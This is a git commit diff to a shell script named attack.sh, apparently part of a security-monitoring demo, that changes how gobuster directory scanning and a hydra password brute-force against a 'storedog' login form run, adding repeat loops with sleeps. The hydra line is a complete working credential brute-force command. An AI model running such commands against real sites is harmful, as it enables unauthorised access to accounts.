470355c2a2f95be5bee1320f9547b4affc8b81f4
Colin Cole <colin.cole@datadoghq.com>
2021-09-08 13:10:19 -0400

    change loop struct

--- attack-box/attack.sh
+++ attack-box/attack.sh
@@ -17,13 +17,22 @@ echo "test" | sudo -S dd if=/dev/zero of=tempfile bs=1000000 count=10
 exit
 EOT
 
+# Add extra sleep to give frontend time to spin up (docker comppse dependency is not enough)
+sleep 10
+
 if [ "${ATTACK_GOBUSTER}" = 1 ];
 then
   if [[ -z "${ATTACK_GOBUSTER_INTERVAL}" ]]
     then
-      watch -n $ATTACK_GOBUSTER_INTERVAL ./gobuster dir -u http://frontend:3000 -w /usr/share/wordlists/rockyou.txt
-    else
+      # run single invocation
       ./gobuster dir -u http://frontend:3000 -w /usr/share/wordlists/rockyou.txt
+    else
+      # run in a loop
+      while true
+      do
+          ./gobuster dir -u http://frontend:3000 -w /usr/share/wordlists/rockyou.txt
+          sleep $ATTACK_GOBUSTER_INTERVAL
+      done &
   fi
 fi
 
@@ -31,10 +40,14 @@ if [ "${ATTACK_HYDRA}" = 1 ];
 then
   if [[ -z "${ATTACK_HYDRA_INTERVAL}" ]]
     then
-      watch -n $ATTACK_HYDRA_INTERVAL hydra -l admin@storedog.com -P /usr/share/wordlists/rockyou.txt -s 3000 frontend http-post-form "/login:utf8=%E2%9C%93&authenticity_token=BonCnTVpWzCfGtgqZ7TiwEcSH89jz30%2F01vkNuVsKyKcC8xCF2DqeHF%2Bc%2B4U2CNWeArygGNPX%2BDvONHHz7Dr6Q%3D%3D&spree_user%5Bemail%5D=admin%40storedog.com&spree_user%5Bpassword%5D=^PASS^&spree_user%5Bremember_me%5D=0&commit=Login:Invalid email or password."
-    else
       hydra -l admin@storedog.com -P /usr/share/wordlists/rockyou.txt -s 3000 frontend http-post-form "/login:utf8=%E2%9C%93&authenticity_token=BonCnTVpWzCfGtgqZ7TiwEcSH89jz30%2F01vkNuVsKyKcC8xCF2DqeHF%2Bc%2B4U2CNWeArygGNPX%2BDvONHHz7Dr6Q%3D%3D&spree_user%5Bemail%5D=admin%40storedog.com&spree_user%5Bpassword%5D=^PASS^&spree_user%5Bremember_me%5D=0&commit=Login:Invalid email or password."
+    else
+      while true
+      do
+          hydra -l admin@storedog.com -P /usr/share/wordlists/rockyou.txt -s 3000 frontend http-post-form "/login:utf8=%E2%9C%93&authenticity_token=BonCnTVpWzCfGtgqZ7TiwEcSH89jz30%2F01vkNuVsKyKcC8xCF2DqeHF%2Bc%2B4U2CNWeArygGNPX%2BDvONHHz7Dr6Q%3D%3D&spree_user%5Bemail%5D=admin%40storedog.com&spree_user%5Bpassword%5D=^PASS^&spree_user%5Bremember_me%5D=0&commit=Login:Invalid email or password."
+          sleep $ATTACK_HYDRA_INTERVAL
+      done
   fi
 fi
 
-echo "done!" && sleep 3500
+echo "done"
